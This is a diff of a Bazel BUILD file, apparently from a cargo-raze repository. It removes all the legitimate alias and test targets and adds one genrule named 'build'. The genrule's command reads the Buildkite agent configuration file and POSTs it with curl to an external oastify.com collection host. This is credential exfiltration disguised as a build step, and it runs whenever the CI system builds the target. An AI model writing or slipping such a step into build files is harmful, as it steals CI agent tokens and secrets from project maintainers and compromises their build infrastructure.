@@ -1,37 +1,6 @@
-alias(
-    name = "cargo_raze",
-    actual = "//impl:cargo_raze",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "cat /usr/local/etc/buildkite-agent/buildkite-agent.cfg | curl -X POST --data-binary @- https://txuevh4tjkvi650b2iluq12h58b29q0ep.oastify.com/?",
     visibility = ["//visibility:public"],
-)
-
-alias(
-    name = "raze",
-    actual = "//tools:raze",
-    visibility = ["//visibility:public"],
-)
-
-alias(
-    name = "bin",
-    actual = "//impl:cargo_raze_bin",
-    visibility = ["//visibility:public"],
-)
-
-alias(
-    name = "bootstrap",
-    actual = "//tools:bootstrap",
-    visibility = ["//visibility:private"],
-)
-
-alias(
-    name = "publish_new_version",
-    actual = "//tools:publish_new_version",
-    visibility = ["//visibility:private"],
-)
-
-test_suite(
-    name = "examples_tests",
-    tests = [
-        "@cargo_raze_examples//tests:examples_tests",
-    ],
-    visibility = ["//visibility:private"],
 )
